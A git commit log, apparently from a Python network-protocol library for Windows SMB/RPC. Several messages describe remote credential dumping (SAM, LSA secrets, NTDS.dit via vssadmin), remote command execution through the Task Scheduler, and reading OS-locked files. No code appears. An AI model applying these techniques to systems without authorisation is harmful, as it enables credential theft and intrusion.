Date:   Sat Nov 2 19:20:02 2013 +0000

    get_share_enum_1() stuff removed. Just left it calling NetrShareEnum for compatibility reasons. Might be out soon. Use NetrShareEnum() instead.

commit df5b504beadc5d9f957eb9e27108f4552b66bebd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 19:04:20 2013 +0000

    Changed my mind.. strings returned are UNICODE (NULL terminated). It's up for the client to decode them. Mainly to maintain same behaviour of other functions

commit d44e3e0b6f371af5ea4db3af42ef1caaac4ee1e1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 23:23:22 2013 +0000

    smbconnection.listShared() now uses NetrEnumShares(). Changed smbclient.py to reflect that change (difference is unicode decode is not needed)

commit 4eed74ea83cda3fc1a512005a1c4a20f025b7a6d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 23:18:57 2013 +0000

    Added NetrShareEnum(). get_share_enum_1() going away soon. Don't use it anymore

commit d90de89bd072975cfe93a9b7fb2052285db8f5a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 21:29:19 2013 +0000

    Added who commands, which calls NetrSessionEnum()

commit b8deea30fb4d783d2c2834e663e7a852d980b9d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 21:25:17 2013 +0000

    Added:
    1) SRVSVCSessionError()
    2) NetrSessionEnum()
    plus minor cosmetic things

commit 73ad64af2fee827d268c94ac97d0c0d858afec6b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 21:08:43 2013 +0000

    Forgot to increment self['Data'] for deferred fields

commit 45c53c718ff3f035f361a5d905152f6609615877
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 20:43:05 2013 +0000

    First try for a generic NDRArray.. I'm sure it'll change in the future

commit a52b612c65af81d8641a049bf701e17ec0513fbe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 20:27:45 2013 +0000

    Opps.. forgot the enclosing bracket :-o

commit 62ba258015d265b394e8b4847a231c1d2f168d4e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 20:27:01 2013 +0000

    Fixed indentation bug for extra items created on the fly

commit 1976d4eda35d23167c5c1fe8d3f486009d72d380
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 15:38:33 2013 +0000

    MACHINE.ACC converted to nthash :)

commit 1936ea0e495e59ee14c00a82528fe7038bbaf73e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 31 21:37:41 2013 +0000

    Added:
    1) DsrGetDcSiteCoverageW
    2) DsrGetSiteName
    3) DsrNetrGetAnyDCName
    4) NetrGetDCName

commit c6e47f4573e2dfb9a11cefac89fdd276396f5707
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 31 20:11:36 2013 +0000

    [MS-NRPC] Netlogon interface implementation. Just starting...

commit 437935cf9a3a59a333c9344b3294bbbaeb246fe4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 31 20:09:40 2013 +0000

    [MS-NRPC] Section 3.1.4.3.2, which adds:
    1) ComputeNetlogonCredential()
    2) ComputeSessionKeyStrongKey()

commit 51208f4ed3b6927c34d40ed76823877e0d2a51d7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 29 16:04:19 2013 +0000

    Added get_dce_rpc() method to the DCERPCTransport. Now clients don't need to cast a transport to a DCERPC_v5 or V4. That is handled by this method.
    I'm changing the examples to reflect this move.

commit 080a149e3f9c4b24401eda27a3c7e58888c26048
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 29 14:33:35 2013 +0000

    Added documentation

commit 37a1759b9bca718e7876040c43fbcdc4be350037
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 28 22:31:50 2013 +0000

    Extra logging info just to let know we're trying to grab the ntds.dit (if found)

commit 32f742404ac405ac09447e62daf40942575c6c2f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 28 16:06:41 2013 +0000

    Added a first try for autocomplete inside the minishell

commit 9d423f2a39b44f321149e0f1ede628613d537cff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 26 18:03:01 2013 +0000

    Removed raise used for debugging, and a bogus bootKey

commit 9270216e926c36632e97918e0850fcbbadaf6c6d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 26 16:58:45 2013 +0000

    Performs various techniques to dump hashes from the remote machine without executing any agent there.
    For SAM and LSA Secrets (including cached creds) we try to read as much as we can from the registry
    and then we save the hives in the target system (%SYSTEMROOT%\\Temp dir) and read the rest of the data from there.
    For NTDS.dit, we have to extract NTDS.dit via vssadmin executed with the smbexec approach. It's copied on the temp dir and parsed remotely.
    The scripts initiates the services required for its working if they are not available (e.g. Remote Registry, even if it is disabled). After the work is done, things are restored to the original state.

commit f91ad83aeb355434227f97eeac2c226e9400cb6c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 22:24:58 2013 +0000

    1) NDRConformantVaryingArray added to ndrutils
    2) LsarQuerySecret, LsarRetrievePrivateData, LsarOpenSecret added to lsarpc
    3) Fixed tab spacing and documentation

commit aa191e23e803db4f4c0e9ebafdd7883172b8034b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 19:25:57 2013 +0000

    Added
    1) LsarOpenAccount
    2) LsarCreateAccount
    3) LsarDeleteObject
    4) LsarSetSystemAccessAccount

commit 63818a88f173466afea659c88f2ab292ab2a3f12
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 18:12:18 2013 +0000

    Removed debug msg

commit c1be1c7fdfc09f3a761cdce5c75dc7b64c96878d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 17:32:06 2013 +0000

    LsarLookupNames2's answer now correctly parser, I had to redefine RPC_UNICODE_STRING as well

commit b56b881e716e2c934087ee9750a4976141f6493b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 25 17:29:05 2013 +0000

    Indentation spaces weren't followed when dumping internal structures of a structure

commit c0f175cce939d8dfd1cd6a0ba014885aa6f8aac9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 22:01:24 2013 +0000

    Adjusting parameters based on previous LsarOpenPolicy2 change

commit fd3526a40c952c500dd9d14b3ef9ebccfdd0aa77
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 21:59:44 2013 +0000

    Implemented LsarLookupNames2().. still need to parse the answer.
    LsaOpenPolicy2 parameter's names changed, so it better reflect what [MS-LSAT] specifies

commit 0e0c326474c906b15c45241f08819fddca68dca9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 21:55:09 2013 +0000

    RPC_UNICODE_STRING implementation with structure.. Needs lots of testing

commit b4f486c5d23e30c14faee1d015735e8c48ed18f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 24 15:52:44 2013 +0000

    Better error handling.

commit b6248aa9fb9d0bda70cd7b28699f40df1a11eb85
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 21:30:20 2013 +0000

    command parameter is not used anymore

commit 976263d0d44b02d54e55abd21364c7d43fc43a39
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 20:52:44 2013 +0000

    For local users, we gotta prepend '.\\'

commit cee60979b35bfa3aaf68a8f7b9146533e95ba042
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:57:14 2013 +0000

    Added information when CREATE and CHANGE are executed

commit 85b47bbb6a64b7db9e67afdca1b8e99a99b9212b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:36:58 2013 +0000

    Now you can specify username and password when changing service's configuration

commit f1fe308178d15737c85caea682f8fe120e1623b6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:25:03 2013 +0000

    1) get_session_key now returns the right session key.
    2) Now all the packets going out request NT ERROR Codes

commit 72a97411b6227312bc8a260c52e6e751ab7eef14
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 19:22:38 2013 +0000

    Compatibility for old SMB servers (NT 4)

commit ce199039001cb1b48425860e8774370fbc580bff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 18:52:52 2013 +0000

    Added getSessionKey() method.. It will still not work for SMBv1 protocol

commit 18c036d70811cc21e4ca684f9dc268ee4d6b07ba
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 18:51:32 2013 +0000

    Added ability to change username and password for the service. However, special attention should be kept by the caller. Read the method's documentation

commit 9b0c2dc60dc4f36ba1f0915442305afe818c8456
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 18:43:33 2013 +0000

    Added [MS-LSAD] Section 5.1.2 / 5.1.3 functions

commit 210cfae6ff0703451a05517e47c62a17c32c49fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 22 15:17:19 2013 +0000

    Extended support for ChangeServiceConfigW().. I still gotta find out how to set a password for a service account. That is pending.
    On services.py, I added the change option

commit a722444cd69fa4a38585f504babddc3c0ce02d05
Author: 6e726d <6e726d@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 21 14:59:17 2013 +0000

    Fix for issue 33. The fix works with implementations that send the information elements out of order.

commit 9f317adbe1b4c8d0abc56589d95a0a1d0942f871
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 21 14:24:40 2013 +0000

    Removed debug message

commit 3f8f52023dcbba06a4bb143fd52010ebe3faedfc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 21 14:12:45 2013 +0000

    Better handling for KeyboardInterrupt. Service name and output files still static until we're sure we're cleaning everything up.

commit ef7c685d260e9fd9afb9ebb6abd4ce83f301c2c1
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 20 21:21:59 2013 +0000

    On the first run, it takes a while the remote target to start executing the job so I'm setting this sleep.. I don't like sleeps.. but this is just an example Best way would be to check the task status before attempting to read the file

commit 179ea7b157ca5d5256c627ef32b52ea1d93f62ca
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 20 20:24:25 2013 +0000

    Protocol specification not needed anymore.. it'll try the list it already has

commit 081badd2443d782cfa06bb1bdd5572914ba08a83
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 20 02:14:24 2013 +0000

    Updated documentation

commit 00a9cb4f5583bc10081266c33112709a0a8c1cc6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 22:52:08 2013 +0000

    Better error checking, adjusted to logging functionality

commit 623b9b7c8d77a00c3837d08df8784c5742d5183a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 22:20:12 2013 +0000

    Implemented SessionError so clients can use this Exception regardless of the underlying SMB version used.

commit dc0ab1c89806878b6493449c521a2346ffaea419
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 22:19:37 2013 +0000

    Removed NT errors from that code and using nt_errors.py instead. SessionError is changed to align it to smb3, smbconnection. Now we only rely on NT Errors. Pending task is to remove all the errors from the library.

commit 94e4196d3caa9b7254e6fad7bbb576c7d3c782f6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 20:07:42 2013 +0000

    Change in SMBFindFileFullDirectoryInfo UnicodeStructure, no need to have 'u'.. changing to ':'

commit 93e7c20c459f6a960f6cadc1466537cb9db0366a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 20:06:11 2013 +0000

    when doing ls, it now prints a ls -la like format

commit 26c469e6eaed89f2de204e7f5da92b14d43c669b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 19 17:56:27 2013 +0000

    Inside listPath, now we ask for FILE_FULL_DIRECTORY_INFORMATION so we can fill all the SharedFile structure, compatible with SMBv1 behaviour

commit 9f786f56ae77da0f7b07b558d2efcf06a4502830
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 18 18:18:22 2013 +0000

    Some improvements in the login parameters. Now DOMAIN/Username is the way to pass data. If no passwd is specified, it is prompted

commit a4d54fc34412ad81749dabe1d86401e61a4e9361
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Oct 18 16:37:48 2013 +0000

    No need to do JobEnum

commit c2cf296566e46fff9a86a39344bd0ee899e2dd37
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:35:14 2013 +0000

    Not used anymore

commit c199697ac7e99846b96665b219db2357b36608d6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:33:41 2013 +0000

    Not used anymore

commit caf4d50a96c935a371765c74b4cf8b235286d740
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:33:07 2013 +0000

    Not used anymore

commit 676039848f72e3b68f925f543a5715681fda521d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:32:12 2013 +0000

    Not used anymore

commit 5eeeb4cf235b8cdb6886b40619b2880a1aff60cb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:21:17 2013 +0000

    Changed command line.. -windows-auth is enough to specify windows auth will be used (no need to put True)

commit 0cba1fd3cea3baaab2fb6bb2190a9e00c4436002
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:17:03 2013 +0000

    Not used anymore

commit e740dd58689f387e0928ee8a4475905ceee6a078
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 20:08:15 2013 +0000

    [MS-RDPBCGR] and [MS-CREDSSP] partial implementation just to reach CredSSP auth. This example test whether an account is valid on the target host.

commit 6cb08415db19af2229d4cce8c7e2e3e6f88b7a4f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 19:55:31 2013 +0000

    Removed the protocols options from the command line. It will try both 445 and 139

commit 09d7258b60835d003295361e1c0975a54e26fad3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 19:47:55 2013 +0000

    replaced for atexec.py

commit 82a8581bb80e99da3e3997e8e57643f62812447f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 19:44:40 2013 +0000

    This example executes a command on the target machine through the Task Scheduler service. Returns the output of such command

commit 1d2b85c92a9cbe96320873e229e232b44733b31f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 17 14:52:08 2013 +0000

    Increasing timeout for SMB connections to 60 seconds

commit d32080ea629f0b1fd1b803cbf59d4b517d7fc8f8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 21:58:09 2013 +0000

    Indentation when printing values

commit 2f153458b9433e37354e97a1881f4ef010daae86
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 21:45:46 2013 +0000

    Better handling for NULL strings

commit c8ec0b91f64920398283fd16108ae93beb535abf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 18:59:29 2013 +0000

    change in logging mode

commit 1e931f59bc5e7e27cc0e4af0c7e16648056979fb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 18:58:06 2013 +0000

    logging mode changed

commit ac4582c270dfa18976030546f599bda08315e891
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 18:56:55 2013 +0000

    Logging goes to stdout

commit ca02edf74bb14f44404cf5a2303741b2b9f36f32
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 17:39:24 2013 +0000

    findKey does not log error anymore if a key is not found.. just returns None

commit ce254ac72b26533676e8a4a6169e6ee8cb230709
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 15 14:11:20 2013 +0000

    Fix a bug in walk when specifing a key that has no more childrens to walk

commit fedbf75ecdb311da7ad3d6b9b2c3d64a362dcb37
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 14 06:06:58 2013 +0000

    Fix in printValue for values REG_NONE

commit e7623de969153d7f5745d0443479cd999537a89f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 14 05:37:51 2013 +0000

    Moving the file parameter to positional arguments

commit c811f3412ed80873421bff73a06abf4ac21dc4f3
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 13 20:04:29 2013 +0000

    When creating a new service, by default it won't be interactive. New serviceType parameter added

commit 57e5c2e620a15a697a77045864f1e1a859120484
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 13 18:08:19 2013 +0000

    Next version will be 0.9.11, not there yet

commit b3a057abef6331e83bd6ba170fcdbc65fc0bea7f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 20:09:14 2013 +0000

    if conversion fails, hashed should be assigned inside the except clause

commit fe5cf512e0473440805b4bfdddb93e9e2a297202
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 19:50:39 2013 +0000

    typo

commit c380fd947592b9e22c1ebf928ce7f6bfaa90d40d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 19:37:56 2013 +0000

    if conversion fails, hashed should be assigned inside the except clause

commit c12776ab36cc6aa3c38dc95ec1a1d914588f83db
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 19:01:43 2013 +0000

    Allows DCERPC transport to get the credentials of an already passed smbConnection

commit f30407f8dea1051d01acb98b06ad7651a85d1864
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 17:51:26 2013 +0000

    Updated example

commit 6396f7508602d78cf819643963ee95b88bbdba1d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 17:40:54 2013 +0000

    Added SchRpcRun() and NetrJobDel()

commit 93325adb8af2925bf8b026d89e698f39b721f52b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 15:49:32 2013 +0000

    Now the ESENT_DB class accepts a remote file object, which is similar to a
    regular filename, but could be remote. It's up to the caller to send an object that
    will behave as a regular file.

commit 32980416f212ad9e65c45e0926ef972992ca6260
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 13:42:50 2013 +0000

    No need for that try: pass at the __del__ method

commit 6eab200c0822badddf5ecca69d92a33e83ccdbc6
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 10 00:00:28 2013 +0000

    Now the Registry class accepts a remote file object, which is similar to a regular filename, but could be remote

commit 6e2059a5ad626d7b1e5c7c7ec40d6ce8cf60ba2b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 9 22:22:22 2013 +0000

    Moving an annoying message to be displayed just in debug mode

commit 1efd12623632f676fe5242fe0b02f911256348ef
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 8 23:07:29 2013 +0000

    Removed unused lines

commit 0f8a2e3cd074a6b8d01848a3166ae329458a964b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 8 20:17:58 2013 +0000

    Example to use the Extensive Storage Library (ese.py).
    Allows dumping catalog, pages and tables.

commit e934123a90df1bd65c7c3f031aeec51c5e7ad345
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 8 20:14:38 2013 +0000

    Microsoft Extensive Storage Engine parser, just focused on trying to parse NTDS.dit files (not meant as a full parser, although it might work)
    Based on the excellent paper by Joachim Metz
    http://forensic-proof.com/wp-content/uploads/2011/07/Extensible-Storage-Engine-ESE-Database-File-EDB-format.pdf

commit b1d45d5937c9744eba037a12b85d51c52d5d5218
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 5 23:14:18 2013 +0000

    Changed dump() method. Now it tried to print the structure based on the original definition, instead of printing the items in whatever order

commit 4fc6803cd0d89bc1ed5ec2e36d02adb3e6b9f9fc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 1 20:45:30 2013 +0000

    changes to documentation

commit ffbb0d20624efad3056b110c1b4b05a89bd305c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 24 17:02:12 2013 +0000

    Added walk option

commit 4f1a66f4829acad851feb8ddf2ca78141c73dd14
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 24 17:01:08 2013 +0000

    Added ability to walk recursively from a key path

commit d74f54cd4d884f1756a4ed62acebb49863a44449
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 23:25:25 2013 +0000

    Fixed bug that was getting 2 bytes short out of a value

commit 83edd0f1f5a3127ff1822b7eba1689e711658147
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 23:13:54 2013 +0000

    Adding support for the default value in a key

commit f7d705ad1de0ef2f6586ace1f3ff02f2aabbcabd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 22:34:53 2013 +0000

    Finally.. If no password is specified, it is asked to the user.. so you don't populate your history with passwords ;)

commit 18b581f6be1e5d7ac8b228e28ee2fcc45500dd8d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 22:05:37 2013 +0000

    Added ChangeServiceConfigW(). Right now it just allows to change the serviceType. That's all we need for now

commit e78d0dcb2f478b2ca3a34026dad95c0165a1ce7d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 21:55:16 2013 +0000

    typo

commit 95994c660dc6b8d6c12e2d393ca767c31b647757
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 21:54:20 2013 +0000

    stripped debug output

commit 7092c2431a9cb53194eaf23dace3ee621f9d5df9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 23 21:53:42 2013 +0000

    forgot to set the variable that states an smb connection was provided, so the connection is not close when finishing the RPC usage

commit adaf46a2ae5445ad91ba1fd4ac2688c2aa39e935
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Sep 22 22:38:58 2013 +0000

    add the possibility to specify an connection already in place for a SMBTransport

commit f6d39cbb2fd8b683c610b19f9e5055cd16741d1a
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Sep 21 17:47:15 2013 +0000

    Added regGetClassInfo()

commit f2514421e7769dc0f0f41d76073dcc8c7a7bacb9
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 20 19:25:11 2013 +0000

    Added regSaveKey()

commit 92bd98ee6d2acc2e10ff6cf6ee043430ea8a4509
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 20 15:19:24 2013 +0000

    Example for windows registry reader.. you will need a registry file (you can grab it with ntfs-read)

commit 4e09877e7fce12a235cfefa29be227a1cf7e7da8
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 20 15:18:26 2013 +0000

    A Windows Registry Parser Library

commit 2100194333f13bb4d976387d6408d572799a28ec
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 16 17:43:01 2013 +0000

    Added PYTHONPATH var to runalltestcases.sh

commit 6d1784bf620cb167a4e0e0e68a026204f046eadb
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Sep 14 01:35:24 2013 +0000

    1) Depending on CD or GET or HEXDUMP, autocompletion will return either just files or directories
    2) Right after starting minishell, the root directory is cached for autocompletion

commit fd757133ce8703858e5330a0dec35888fd17eb50
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Sep 14 01:13:07 2013 +0000

    1) INODE.walk() doesn't print the results anymore.. it just returns a list of entries. Up to the caller
    2) FileAttributes better printed
    3) Simplification of the CD method
    4) Now, after a CD, it caches the entries of the new directory for TAB completion
    5) get/cat/hexview all call the same method

commit 23ac6774a7ce97aeedae92e0227f6f7f249119bd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 13 20:25:12 2013 +0000

    An ugly implementation of ntfs so you could read an ntfs volume.. just for fun.. interesting for grabbing files that are locked by the OS ( guess what files ;) )

commit 248b642929910dd48dd06bc6857e7bdf481d826c
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 5 15:37:45 2013 +0000

     * Moving EAPOL, EAP and WPS decoders to ImpactDecoder to break cyclic dependency.
     * Adding copyright header to new files.

commit a3385a444e0006605ab9f105c3729c8f6a49bf71
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 5 15:36:22 2013 +0000

    Infers the PYTHONPATH to run the tests

commit 244a6d4b9528940d2d3eb7795e0fc225603cd811
Author: aurelianocalvo@gmail.com <aurelianocalvo@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
